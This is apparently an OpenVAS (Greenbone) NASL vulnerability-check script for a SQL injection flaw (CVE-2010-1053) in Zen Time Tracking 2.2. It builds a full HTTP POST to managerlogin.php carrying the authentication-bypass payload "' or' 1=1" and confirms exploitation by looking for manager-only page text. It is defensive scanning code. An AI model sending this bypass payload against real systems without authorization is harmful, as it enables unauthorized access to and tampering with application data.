# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800748");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2010-04-06 08:47:09 +0200 (Tue, 06 Apr 2010)");
  script_cve_id("CVE-2010-1053");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Zen Time Tracking multiple SQL Injection vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/38471");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38153");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/56146");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/11345");

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation could allow the attacker to view, add,
  modify or delete information in the underlying database.");

  script_tag(name:"affected", value:"Zen Time Tracking version 2.2 and prior.");

  script_tag(name:"insight", value:"Inputs passed to 'username' and 'password' parameters in
  'userlogin.php' and 'managerlogin.php' are not properly sanitised before
  using it in an sql query, when 'magic_quotes_gpc' is disabled.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Zen Time Tracking is prone to multiple SQL Injection vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);

foreach path (make_list_unique("/", "/ZenTimeTracking", "/zentimetracking", http_cgi_dirs(port:port)))
{

  if(path == "/") path = "";

  res = http_get_cache(item: path + "/index.php", port:port);

  if("Zen Time Tracking" >< res)
  {
    useragent = http_get_user_agent();
    filename = string(path + "/managerlogin.php");
    authVariables = "username=' or' 1=1&password=' or' 1=1";

    req2 = string( "POST ", filename, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "User-Agent: ", useragent, "\r\n",
                      "Accept: text/html,application/xhtml+xml\r\n",
                      "Accept-Language: en-us,en;q=0.5\r\n",
                      "Accept-Encoding: gzip,deflate\r\n",
                      "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
                      "Keep-Alive: 300\r\n",
                      "Connection: keep-alive\r\n",
                      "Referer: http://", host, filename, "\r\n",
                      "Cookie: PHPSESSID=bfc4433ae91a4bfe3f70ee900c50d39b\r\n",
                      "Content-Type: application/x-www-form-urlencoded\r\n",
                      "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                       authVariables);
    res2 = http_keepalive_send_recv(port:port, data:req2);

    if("Create Group" >< res2 && "Assign Group"  >< res2 &&
       "Log Off" >< res2)
    {
      report = http_report_vuln_url(port:port, url:filename);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
